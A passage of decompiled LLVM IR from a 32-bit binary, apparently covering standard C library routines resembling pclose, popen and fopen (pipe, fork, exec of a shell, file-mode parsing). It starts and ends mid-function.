  br i1 %v1_804b96a, label %dec_label_pc_804b984, label %dec_label_pc_804b96e

dec_label_pc_804b96e:                             ; preds = %dec_label_pc_804b935
  %v16_804b972 = icmp eq i32 %v1_804b935, 0
  %v1_804b976 = icmp eq i1 %v16_804b972, false
  br i1 %v1_804b976, label %dec_label_pc_804b97d, label %dec_label_pc_804b978

dec_label_pc_804b978:                             ; preds = %dec_label_pc_804b96e
  %v1_804b978 = add i32 %v2_804b935, -1
  br label %dec_label_pc_804b97d

dec_label_pc_804b97d:                             ; preds = %dec_label_pc_804b96e, %dec_label_pc_804b978
  %stack_var_-80.0.in = phi i32 [ %v0_804b935, %dec_label_pc_804b96e ], [ %v1_804b978, %dec_label_pc_804b978 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804b987.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b984

dec_label_pc_804b984:                             ; preds = %dec_label_pc_804b935, %dec_label_pc_804b97d
  %v0_804b987 = phi i32 [ %v5_804b960, %dec_label_pc_804b935 ], [ %v0_804b987.pre, %dec_label_pc_804b97d ]
  %v2_804b989 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b989, i32* @ebx, align 4
  store i32 %v0_804b8de, i32* @esi, align 4
  store i32 %v0_804b8dd, i32* @edi, align 4
  store i32 %v0_804b8dc, i32* @ebp, align 4
  ret i32 %v0_804b987

; uselistorder directives
  uselistorder i32 %v0_804b935, { 1, 0 }
  uselistorder i32 %v1_804b935, { 1, 0 }
  uselistorder i32 %v1_804b92f, { 1, 2, 0 }
  uselistorder i32 %v0_804b92f, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_804b984, { 1, 0 }
  uselistorder label %dec_label_pc_804b97d, { 1, 0 }
  uselistorder label %dec_label_pc_804b935, { 1, 0 }
}

define i32 @function_804b990(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b990:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804b9a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b9a4, i32* @eax, align 4
  store i32 %v2_804b9a4, i32* %stack_var_-60, align 4
  %v2_804b9a9 = call i32 @function_804f2ae(i32 %v2_804b9a4, i32 134541995)
  store i32 ptrtoint (i32* @global_var_8056504.111 to i32), i32* %stack_var_-60, align 4
  %v1_804b9b5 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056504.111 to i32))
  %v0_804b9ba = load i32, i32* @global_var_805651c.112, align 4
  store i32 %v0_804b9ba, i32* @ebx, align 4
  %v1_804b9c3 = icmp eq i32 %v0_804b9ba, 0
  br i1 %v1_804b9c3, label %dec_label_pc_804b9f9, label %dec_label_pc_804b9c7

dec_label_pc_804b9c7:                             ; preds = %dec_label_pc_804b990
  %v1_804b9c7 = add i32 %v0_804b9ba, 4
  %v2_804b9c7 = inttoptr i32 %v1_804b9c7 to i32*
  %v3_804b9c7 = load i32, i32* %v2_804b9c7, align 4
  %v4_804b9c7 = load i32, i32* @edi, align 4
  %v15_804b9c7 = icmp eq i32 %v3_804b9c7, %v4_804b9c7
  %v1_804b9ca = icmp eq i1 %v15_804b9c7, false
  br i1 %v1_804b9ca, label %dec_label_pc_804b9e8, label %dec_label_pc_804b9cc

dec_label_pc_804b9cc:                             ; preds = %dec_label_pc_804b9c7
  %v1_804b9cc = inttoptr i32 %v0_804b9ba to i32*
  %v2_804b9cc = load i32, i32* %v1_804b9cc, align 4
  store i32 %v2_804b9cc, i32* @global_var_805651c.112, align 4
  br label %dec_label_pc_804b9f9

dec_label_pc_804b9d5:                             ; preds = %dec_label_pc_804b9e8
  %v0_804b9d5 = load i32, i32* %stack_var_-60, align 4
  %v1_804b9d5 = call i32 @function_804b774(i32 %v0_804b9d5)
  %v1_804b9da = inttoptr i32 %v1_804b9d5 to i32*
  store i32 22, i32* %v1_804b9da, align 4
  br label %dec_label_pc_804b9f9

dec_label_pc_804b9e2:                             ; preds = %dec_label_pc_804ba25
  %v3_804b9e2 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804ba47

dec_label_pc_804b9e8:                             ; preds = %dec_label_pc_804b9c7, %dec_label_pc_804b9f0
  %v1_804b9f7 = phi i32 [ %v2_804b9ea, %dec_label_pc_804b9f0 ], [ %v0_804b9ba, %dec_label_pc_804b9c7 ]
  %v1_804b9ea = inttoptr i32 %v1_804b9f7 to i32*
  %v2_804b9ea = load i32, i32* %v1_804b9ea, align 4
  store i32 %v2_804b9ea, i32* @ebx, align 4
  %v1_804b9ec = icmp eq i32 %v2_804b9ea, 0
  br i1 %v1_804b9ec, label %dec_label_pc_804b9d5, label %dec_label_pc_804b9f0

dec_label_pc_804b9f0:                             ; preds = %dec_label_pc_804b9e8
  %v1_804b9f0 = add i32 %v2_804b9ea, 4
  %v2_804b9f0 = inttoptr i32 %v1_804b9f0 to i32*
  %v3_804b9f0 = load i32, i32* %v2_804b9f0, align 4
  %v15_804b9f0 = icmp eq i32 %v3_804b9f0, %v4_804b9c7
  %v1_804b9f3 = icmp eq i1 %v15_804b9f0, false
  br i1 %v1_804b9f3, label %dec_label_pc_804b9e8, label %dec_label_pc_804b9f5

dec_label_pc_804b9f5:                             ; preds = %dec_label_pc_804b9f0
  %v1_804b9f5 = inttoptr i32 %v2_804b9ea to i32*
  %v2_804b9f5 = load i32, i32* %v1_804b9f5, align 4
  store i32 %v2_804b9f5, i32* %v1_804b9ea, align 4
  br label %dec_label_pc_804b9f9

dec_label_pc_804b9f9:                             ; preds = %dec_label_pc_804b990, %dec_label_pc_804b9d5, %dec_label_pc_804b9cc, %dec_label_pc_804b9f5
  store i32 %v2_804b9a4, i32* @eax, align 4
  store i32 %v2_804b9a4, i32* %stack_var_-60, align 4
  %v2_804ba02 = call i32 @function_804f2ae(i32 %v2_804b9a4, i32 1)
  %v0_804ba0a = load i32, i32* @ebx, align 4
  %v1_804ba0a = icmp eq i32 %v0_804ba0a, 0
  br i1 %v1_804ba0a, label %dec_label_pc_804ba44, label %dec_label_pc_804ba0e

dec_label_pc_804ba0e:                             ; preds = %dec_label_pc_804b9f9
  %v1_804ba11 = add i32 %v0_804ba0a, 8
  %v2_804ba11 = inttoptr i32 %v1_804ba11 to i32*
  %v3_804ba11 = load i32, i32* %v2_804ba11, align 4
  store i32 %v3_804ba11, i32* @esi, align 4
  store i32 %v0_804ba0a, i32* %stack_var_-60, align 4
  %v1_804ba15 = call i32 @function_804e725(i32 %v0_804ba0a)
  store i32 %v1_804ba15, i32* @eax, align 4
  %v0_804ba1a = load i32, i32* @edi, align 4
  store i32 %v0_804ba1a, i32* %stack_var_-60, align 4
  %v1_804ba1d = inttoptr i32 %v0_804ba1a to i16*
  %v2_804ba1d = call i32 @function_804b77c(i16* %v1_804ba1d)
  %v2_804ba28 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_804ba25

dec_label_pc_804ba25:                             ; preds = %dec_label_pc_804ba3a, %dec_label_pc_804ba0e
  %v0_804ba25 = phi i32 [ %v1_804ba3a, %dec_label_pc_804ba3a ], [ %v2_804ba1d, %dec_label_pc_804ba0e ]
  %v0_804ba2d = load i32, i32* @esi, align 4
  store i32 %v0_804ba2d, i32* %stack_var_-60, align 4
  %v4_804ba2e = call i32 @function_804b700(i32 %v0_804ba2d, i32 %v2_804ba28, i32 0, i32 %v0_804ba25)
  %v2_804ba36 = icmp slt i32 %v4_804ba2e, 0
  %v1_804ba38 = icmp eq i1 %v2_804ba36, false
  br i1 %v1_804ba38, label %dec_label_pc_804b9e2, label %dec_label_pc_804ba3a

dec_label_pc_804ba3a:                             ; preds = %dec_label_pc_804ba25
  %v0_804ba3a = load i32, i32* %stack_var_-60, align 4
  %v1_804ba3a = call i32 @function_804b774(i32 %v0_804ba3a)
  %v1_804ba3f = inttoptr i32 %v1_804ba3a to i32*
  %v2_804ba3f = load i32, i32* %v1_804ba3f, align 4
  %v11_804ba3f = icmp eq i32 %v2_804ba3f, 4
  br i1 %v11_804ba3f, label %dec_label_pc_804ba25, label %dec_label_pc_804ba44.loopexit

dec_label_pc_804ba44.loopexit:                    ; preds = %dec_label_pc_804ba3a
  br label %dec_label_pc_804ba44

dec_label_pc_804ba44:                             ; preds = %dec_label_pc_804ba44.loopexit, %dec_label_pc_804b9f9
  br label %dec_label_pc_804ba47

dec_label_pc_804ba47:                             ; preds = %dec_label_pc_804b9e2, %dec_label_pc_804ba44
  %storemerge = phi i32 [ -1, %dec_label_pc_804ba44 ], [ %v3_804b9e2, %dec_label_pc_804b9e2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ba3a, { 1, 0 }
  uselistorder i32 %v0_804ba0a, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804b9ea, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_804b9a4, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_804ba47, { 1, 0 }
  uselistorder label %dec_label_pc_804b9f9, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804b9e8, { 1, 0 }
}

define i32 @function_804ba4e(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804ba4e:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v15_804ba50 = ptrtoint i32* %stack_var_-60 to i32
  %v4_804ba53 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804ba53, i32* @ebx, align 4
  %v2_804ba57 = load i8, i8* %arg2, align 1
  %v10_804ba59 = icmp eq i8 %v2_804ba57, 119
  br i1 %v10_804ba59, label %dec_label_pc_804ba88, label %dec_label_pc_804ba5d

dec_label_pc_804ba5d:                             ; preds = %dec_label_pc_804ba4e
  %v10_804ba65 = icmp eq i8 %v2_804ba57, 114
  br i1 %v10_804ba65, label %dec_label_pc_804ba88, label %dec_label_pc_804ba69

dec_label_pc_804ba69:                             ; preds = %dec_label_pc_804ba5d
  %v1_804ba69 = call i32 @function_804b774(i32 1)
  %v1_804ba6e = inttoptr i32 %v1_804ba69 to i32*
  store i32 22, i32* %v1_804ba6e, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bc3f

dec_label_pc_804ba88:                             ; preds = %dec_label_pc_804ba4e, %dec_label_pc_804ba5d
  %v0_804bb56 = phi i32 [ 1, %dec_label_pc_804ba5d ], [ 0, %dec_label_pc_804ba4e ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_804ba8d = call i32 @function_804da52(i32 12)
  %v1_804ba99 = icmp eq i32 %v1_804ba8d, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_804ba99, label %dec_label_pc_804bc3f, label %dec_label_pc_804baa8

dec_label_pc_804baa8:                             ; preds = %dec_label_pc_804ba88
  %v2_804baab = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804baab, i32* %stack_var_-76, align 4
  %v1_804bab0 = call i32 @function_804f9d0(i32 %v2_804baab)
  %v1_804bab8 = icmp eq i32 %v1_804bab0, 0
  %v1_804baba = icmp eq i1 %v1_804bab8, false
  br i1 %v1_804baba, label %dec_label_pc_804bc28, label %dec_label_pc_804bac0

dec_label_pc_804bac0:                             ; preds = %dec_label_pc_804baa8
  %tmp38 = sub nsw i32 0, %v0_804bb56
  %v2_804bac4 = and i32 %tmp38, 4
  %v3_804bac4 = add i32 %v15_804ba50, 44
  %v4_804bac4 = add i32 %v3_804bac4, %v2_804bac4
  %v5_804bac4 = inttoptr i32 %v4_804bac4 to i32*
  %v6_804bac4 = load i32, i32* %v5_804bac4, align 4
  %v5_804bad1 = xor i32 %v0_804bb56, 1
  %tmp39 = sub nsw i32 0, %v5_804bad1
  %v2_804bad5 = and i32 %tmp39, 4
  %v4_804bad5 = add i32 %v3_804bac4, %v2_804bad5
  %v5_804bad5 = inttoptr i32 %v4_804bad5 to i32*
  %v6_804bad5 = load i32, i32* %v5_804bad5, align 4
  %v0_804badd = load i32, i32* @ecx, align 4
  %v0_804badf = load i32, i32* @ebx, align 4
  store i32 %v6_804bad5, i32* %stack_var_-76, align 4
  %v5_804bae1 = call i32 @function_804fbd8(i32 %v6_804bad5, i32 %v0_804badf, i32 %v0_804badd, i32 %v0_804badd)
  store i32 %v5_804bae1, i32* %stack_var_-60, align 4
  %v1_804baed = icmp eq i32 %v5_804bae1, 0
  %v1_804baef = icmp eq i1 %v1_804baed, false
  br i1 %v1_804baef, label %dec_label_pc_804bb0c, label %dec_label_pc_804baf1

dec_label_pc_804baf1:                             ; preds = %dec_label_pc_804bac0
  store i32 %v6_804bad5, i32* %stack_var_-76, align 4
  %v1_804baf8 = call i32 @function_804b4a4(i32 %v6_804bad5)
  %v2_804bafd = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804bafd, i32* %edx.global-to-local, align 4
  store i32 %v6_804bac4, i32* %stack_var_-76, align 4
  %v1_804bb02 = call i32 @function_804b4a4(i32 %v6_804bac4)
  br label %dec_label_pc_804bc25

dec_label_pc_804bb0c:                             ; preds = %dec_label_pc_804bac0
  %v2_804bb17 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bb17, i32* @eax, align 4
  store i32 %v2_804bb17, i32* %stack_var_-76, align 4
  %v3_804bb1c = call i32 @function_804f2ae(i32 %v2_804bb17, i32 134541995)
  store i32 ptrtoint (i32* @global_var_8056504.111 to i32), i32* %stack_var_-76, align 4
  %v1_804bb28 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056504.111 to i32))
  %v0_804bb2d = call i32 @function_804f5c4()
  store i32 %v0_804bb2d, i32* @eax, align 4
  store i32 %v0_804bb2d, i32* @ebx, align 4
  %v1_804bb37 = icmp eq i32 %v0_804bb2d, 0
  %v1_804bb39 = icmp eq i1 %v1_804bb37, false
  br i1 %v1_804bb39, label %dec_label_pc_804bbb3, label %dec_label_pc_804bb3b

dec_label_pc_804bb3b:                             ; preds = %dec_label_pc_804bb0c
  store i32 %v6_804bad5, i32* %stack_var_-76, align 4
  %v1_804bb42 = call i32 @function_804b4a4(i32 %v6_804bad5)
  store i32 %v0_804bb56, i32* %edx.global-to-local, align 4
  %v15_804bb4e = icmp eq i32 %v6_804bac4, %v0_804bb56
  br i1 %v15_804bb4e, label %dec_label_pc_804bb6d, label %dec_label_pc_804bb54

dec_label_pc_804bb54:                             ; preds = %dec_label_pc_804bb3b
  store i32 %v6_804bac4, i32* %stack_var_-76, align 4
  %v5_804bb5b = call i32 @function_804f75c(i32 %v6_804bac4, i32 %v0_804bb56, i32 %v1_804bb42, i32 %v1_804bb42)
  store i32 %v6_804bac4, i32* %stack_var_-76, align 4
  %v1_804bb65 = call i32 @function_804b4a4(i32 %v6_804bac4)
  br label %dec_label_pc_804bb6d

dec_label_pc_804bb6d:                             ; preds = %dec_label_pc_804bb3b, %dec_label_pc_804bb54
  %v0_804bb6d = load i32, i32* @global_var_805651c.112, align 4
  store i32 %v0_804bb6d, i32* @ebx, align 4
  %v1_804bb883 = icmp eq i32 %v0_804bb6d, 0
  %v1_804bb8a10 = icmp eq i1 %v1_804bb883, false
  br i1 %v1_804bb8a10, label %dec_label_pc_804bb75, label %dec_label_pc_804bb8c

dec_label_pc_804bb75:                             ; preds = %dec_label_pc_804bb6d, %dec_label_pc_804bb75
  %v0_804bb75 = phi i32 [ %v2_804bb83, %dec_label_pc_804bb75 ], [ %v0_804bb6d, %dec_label_pc_804bb6d ]
  %v1_804bb75 = add i32 %v0_804bb75, 4
  %v2_804bb75 = inttoptr i32 %v1_804bb75 to i32*
  %v3_804bb75 = load i32, i32* %v2_804bb75, align 4
  %v1_804bb7b = add i32 %v3_804bb75, 4
  %v2_804bb7b = inttoptr i32 %v1_804bb7b to i32*
  %v3_804bb7b = load i32, i32* %v2_804bb7b, align 4
  store i32 %v3_804bb7b, i32* %stack_var_-76, align 4
  %v1_804bb7e = call i32 @function_804b4a4(i32 %v3_804bb7b)
  %v0_804bb83 = load i32, i32* @ebx, align 4
  %v1_804bb83 = inttoptr i32 %v0_804bb83 to i32*
  %v2_804bb83 = load i32, i32* %v1_804bb83, align 4
  store i32 %v2_804bb83, i32* @ebx, align 4
  %v1_804bb88 = icmp eq i32 %v2_804bb83, 0
  %v1_804bb8a = icmp eq i1 %v1_804bb88, false
  br i1 %v1_804bb8a, label %dec_label_pc_804bb75, label %dec_label_pc_804bb8c

dec_label_pc_804bb8c:                             ; preds = %dec_label_pc_804bb75, %dec_label_pc_804bb6d
  store i32 0, i32* %stack_var_-76, align 4
  %v8_804bba4 = call i32 @function_804ef2c(i32 ptrtoint ([8 x i8]* @global_var_80536a3.115 to i32), i32 ptrtoint ([3 x i8]* @global_var_80536a8.114 to i32), i32 ptrtoint ([3 x i8]* @global_var_80536a0.113 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %stack_var_-76, align 4
  %v1_804bbae = call i32 @function_804f700(i32 127)
  unreachable

dec_label_pc_804bbb3:                             ; preds = %dec_label_pc_804bb0c
  store i32 %v2_804bb17, i32* @esi, align 4
  store i32 %v2_804bb17, i32* %stack_var_-76, align 4
  %v3_804bbbc = call i32 @function_804f2ae(i32 %v2_804bb17, i32 1)
  store i32 %v6_804bac4, i32* %stack_var_-76, align 4
  %v1_804bbc6 = call i32 @function_804b4a4(i32 %v6_804bac4)
  store i32 %v1_804bbc6, i32* @eax, align 4
  %v0_804bbce = load i32, i32* @ebx, align 4
  %tmp41 = icmp slt i32 %v0_804bbce, 1
  br i1 %tmp41, label %dec_label_pc_804bc19, label %dec_label_pc_804bbd2

dec_label_pc_804bbd2:                             ; preds = %dec_label_pc_804bbb3
  store i32 %v1_804ba8d, i32* @eax, align 4
  %v2_804bbd6 = add i32 %v1_804ba8d, 8
  %v3_804bbd6 = inttoptr i32 %v2_804bbd6 to i32*
  store i32 %v0_804bbce, i32* %v3_804bbd6, align 4
  %v2_804bbd9 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_804bbd9, i32* %edx.global-to-local, align 4
  %v1_804bbdc = load i32, i32* @eax, align 4
  %v2_804bbdc = add i32 %v1_804bbdc, 4
  %v3_804bbdc = inttoptr i32 %v2_804bbdc to i32*
  store i32 %v2_804bbd9, i32* %v3_804bbdc, align 4
  store i32 %v2_804bb17, i32* %stack_var_-76, align 4
  %v3_804bbeb = call i32 @function_804f2ae(i32 %v2_804bb17, i32 134541995)
  store i32 ptrtoint (i32* @global_var_8056504.111 to i32), i32* %stack_var_-76, align 4
  %v1_804bbf7 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056504.111 to i32))
  store i32 %v1_804ba8d, i32* %edx.global-to-local, align 4
  %v0_804bc00 = load i32, i32* @global_var_805651c.112, align 4
  store i32 %v0_804bc00, i32* @eax, align 4
  %v2_804bc05 = inttoptr i32 %v1_804ba8d to i32*
  store i32 %v0_804bc00, i32* %v2_804bc05, align 4
  %v0_804bc07 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804bc07, i32* @global_var_805651c.112, align 4
  store i32 %v2_804bb17, i32* %stack_var_-76, align 4
  %v3_804bc12 = call i32 @function_804f2ae(i32 %v2_804bb17, i32 1)
  %v2_804bc3f.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bc3c

dec_label_pc_804bc19:                             ; preds = %dec_label_pc_804bbb3
  %v3_804bc1c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_804bc1c, i32* %stack_var_-76, align 4
  %v1_804bc20 = inttoptr i32 %v3_804bc1c to i16*
  %v2_804bc20 = call i32 @function_804b77c(i16* %v1_804bc20)
  br label %dec_label_pc_804bc25

dec_label_pc_804bc25:                             ; preds = %dec_label_pc_804baf1, %dec_label_pc_804bc19
  br label %dec_label_pc_804bc28

dec_label_pc_804bc28:                             ; preds = %dec_label_pc_804baa8, %dec_label_pc_804bc25
  store i32 %v1_804ba8d, i32* %stack_var_-76, align 4
  %v1_804bc2f = call i32 @function_804e725(i32 %v1_804ba8d)
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bc3c

dec_label_pc_804bc3c:                             ; preds = %dec_label_pc_804bbd2, %dec_label_pc_804bc28
  %v2_804bc3f.pre = phi i32 [ %v2_804bc3f.pre.pre, %dec_label_pc_804bbd2 ], [ 0, %dec_label_pc_804bc28 ]
  br label %dec_label_pc_804bc3f

dec_label_pc_804bc3f:                             ; preds = %dec_label_pc_804ba88, %dec_label_pc_804ba69, %dec_label_pc_804bc3c
  %v2_804bc3f = phi i32 [ 0, %dec_label_pc_804ba88 ], [ 0, %dec_label_pc_804ba69 ], [ %v2_804bc3f.pre, %dec_label_pc_804bc3c ]
  ret i32 %v2_804bc3f

; uselistorder directives
  uselistorder i32 %v0_804bbce, { 1, 0 }
  uselistorder i32 %v2_804bb83, { 1, 2, 0 }
  uselistorder i32 %v0_804bb2d, { 1, 0, 2 }
  uselistorder i32 %v2_804bb17, { 1, 0, 3, 2, 5, 4, 6, 8, 7, 9 }
  uselistorder i32 %v6_804bad5, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_804bac4, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_804baab, { 1, 0 }
  uselistorder i32 %v1_804ba8d, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32 %v0_804bb56, { 1, 0, 4, 2, 3 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_8056504.111 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bc3f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bc3c, { 1, 0 }
  uselistorder label %dec_label_pc_804bc28, { 1, 0 }
  uselistorder label %dec_label_pc_804bc25, { 1, 0 }
  uselistorder label %dec_label_pc_804bb75, { 1, 0 }
  uselistorder label %dec_label_pc_804bb6d, { 1, 0 }
  uselistorder label %dec_label_pc_804ba88, { 1, 0 }
}

define i32 @function_804bc48(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bc48:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bc48 = load i32, i32* @ebp, align 4
  %v0_804bc49 = load i32, i32* @edi, align 4
  %v0_804bc4a = load i32, i32* @esi, align 4
  %v0_804bc4b = load i32, i32* @ebx, align 4
  store i32 %v0_804bc4b, i32* %stack_var_-16, align 4
  %v4_804bc4f = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bc4f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804bc5f = load i8, i8* %arg2, align 1
  %v3_804bc5f = zext i8 %v2_804bc5f to i32
  %v4_804bc5f = load i32, i32* @eax, align 4
  %v5_804bc5f = and i32 %v4_804bc5f, -256
  %v6_804bc5f = or i32 %v5_804bc5f, %v3_804bc5f
  store i32 %v6_804bc5f, i32* %eax.global-to-local, align 4
  %v10_804bc61 = icmp eq i8 %v2_804bc5f, 114
  br i1 %v10_804bc61, label %dec_label_pc_804bca3, label %dec_label_pc_804bc65

dec_label_pc_804bc65:                             ; preds = %dec_label_pc_804bc48
  store i32 577, i32* @ebx, align 4
  %v10_804bc6a = icmp eq i8 %v2_804bc5f, 119
  br i1 %v10_804bc6a, label %dec_label_pc_804bca5, label %dec_label_pc_804bc6e

dec_label_pc_804bc6e:                             ; preds = %dec_label_pc_804bc65
  store i32 1089, i32* @ebx, align 4
  %v10_804bc72 = icmp eq i8 %v2_804bc5f, 97
  br i1 %v10_804bc72, label %dec_label_pc_804bca5, label %dec_label_pc_804bc76

dec_label_pc_804bc76:                             ; preds = %dec_label_pc_804bd1e, %dec_label_pc_804bcf8, %dec_label_pc_804bc6e
  %v0_804bc76 = load i32, i32* %stack_var_-16, align 4
  %v1_804bc76 = call i32 @function_804b774(i32 %v0_804bc76)
  store i32 %v1_804bc76, i32* %eax.global-to-local, align 4
  %v0_804bc7b = load i32, i32* @ebp, align 4
  %v1_804bc7b = icmp eq i32 %v0_804bc7b, 0
  %v1_804bc7d = inttoptr i32 %v1_804bc76 to i32*
  store i32 22, i32* %v1_804bc7d, align 4
  br i1 %v1_804bc7b, label %dec_label_pc_804be6b, label %dec_label_pc_804bc89

dec_label_pc_804bc89:                             ; preds = %dec_label_pc_804bd47, %dec_label_pc_804bc76
  %v0_804bc89 = load i32, i32* @ebp, align 4
  %v1_804bc89 = add i32 %v0_804bc89, 1
  %v2_804bc89 = inttoptr i32 %v1_804bc89 to i8*
  %v3_804bc89 = load i8, i8* %v2_804bc89, align 1
  %v4_804bc89 = and i8 %v3_804bc89, 32
  %v5_804bc89 = icmp eq i8 %v4_804bc89, 0
  br i1 %v5_804bc89, label %dec_label_pc_804be6b, label %dec_label_pc_804bc93

dec_label_pc_804bc93:                             ; preds = %dec_label_pc_804bc89
  store i32 %v0_804bc89, i32* %stack_var_-76, align 4
  %v1_804bc97 = call i32 @function_804e725(i32 %v0_804bc89)
  store i32 %v1_804bc97, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804be66

dec_label_pc_804bca3:                             ; preds = %dec_label_pc_804bc48
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804bca5

dec_label_pc_804bca5:                             ; preds = %dec_label_pc_804bc6e, %dec_label_pc_804bc65, %dec_label_pc_804bca3
  %v0_804bcb6 = phi i32 [ 1089, %dec_label_pc_804bc6e ], [ 577, %dec_label_pc_804bc65 ], [ 1, %dec_label_pc_804bca3 ]
  %v1_804bca5 = add i32 %v4_804bc4f, 1
  store i32 %v1_804bca5, i32* %eax.global-to-local, align 4
  %v2_804bca8 = inttoptr i32 %v1_804bca5 to i8*
  %v3_804bca8 = load i8, i8* %v2_804bca8, align 1
  %v12_804bca8 = icmp eq i8 %v3_804bca8, 98
  br i1 %v12_804bca8, label %dec_label_pc_804bcb0, label %dec_label_pc_804bcae

dec_label_pc_804bcae:                             ; preds = %dec_label_pc_804bca5
  store i32 %v4_804bc4f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bcb0

dec_label_pc_804bcb0:                             ; preds = %dec_label_pc_804bca5, %dec_label_pc_804bcae
  %v0_804bcb0 = phi i32 [ %v1_804bca5, %dec_label_pc_804bca5 ], [ %v4_804bc4f, %dec_label_pc_804bcae ]
  %v1_804bcb0 = add i32 %v0_804bcb0, 1
  %v2_804bcb0 = inttoptr i32 %v1_804bcb0 to i8*
  %v3_804bcb0 = load i8, i8* %v2_804bcb0, align 1
  %v12_804bcb0 = icmp eq i8 %v3_804bcb0, 43
  %v1_804bcb4 = icmp eq i1 %v12_804bcb0, false
  br i1 %v1_804bcb4, label %dec_label_pc_804bcbe, label %dec_label_pc_804bcb6

dec_label_pc_804bcb6:                             ; preds = %dec_label_pc_804bcb0
  store i32 %v0_804bcb6, i32* %eax.global-to-local, align 4
  %v1_804bcbb = add nuw nsw i32 %v0_804bcb6, 1
  store i32 %v1_804bcbb, i32* @ebx, align 4
  br label %dec_label_pc_804bcbe

dec_label_pc_804bcbe:                             ; preds = %dec_label_pc_804bcb0, %dec_label_pc_804bcb6
  %v1_804bcbe = icmp eq i32 %arg3, 0
  %v1_804bcc0 = icmp eq i1 %v1_804bcbe, false
  br i1 %v1_804bcc0, label %dec_label_pc_804bcf4, label %dec_label_pc_804bcc2

dec_label_pc_804bcc2:                             ; preds = %dec_label_pc_804bcbe
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804bcc7 = call i32 @function_804da52(i32 80)
  store i32 %v1_804bcc7, i32* %eax.global-to-local, align 4
  store i32 %v1_804bcc7, i32* @ebp, align 4
  %v2_804bcd1 = icmp eq i32 %v1_804bcc7, 0
  br i1 %v2_804bcd1, label %dec_label_pc_804be6d, label %dec_label_pc_804bcd9

dec_label_pc_804bcd9:                             ; preds = %dec_label_pc_804bcc2
  %v2_804bcc7 = inttoptr i32 %v1_804bcc7 to i16*
  store i16 8192, i16* %v2_804bcc7, align 2
  %v2_804bce1 = add i32 %v1_804bcc7, 8
  %v3_804bce1 = inttoptr i32 %v2_804bce1 to i32*
  store i32 0, i32* %v3_804bce1, align 4
  %v2_804bce8 = add i32 %v1_804bcc7, 56
  store i32 %v2_804bce8, i32* %eax.global-to-local, align 4
  store i32 %v2_804bce8, i32* %stack_var_-76, align 4
  %v1_804bcec = call i32 @function_804bed9(i32 %v2_804bce8)
  store i32 %v1_804bcec, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bcf4

dec_label_pc_804bcf4:                             ; preds = %dec_label_pc_804bcbe, %dec_label_pc_804bcd9
  %v2_804bcf4 = icmp slt i32 %arg4, 0
  br i1 %v2_804bcf4, label %dec_label_pc_804bd41, label %dec_label_pc_804bcf8

dec_label_pc_804bcf8:                             ; preds = %dec_label_pc_804bcf4
  %v0_804bcf8 = load i32, i32* @ebx, align 4
  %v0_804bcfa = load i32, i32* @esi, align 4
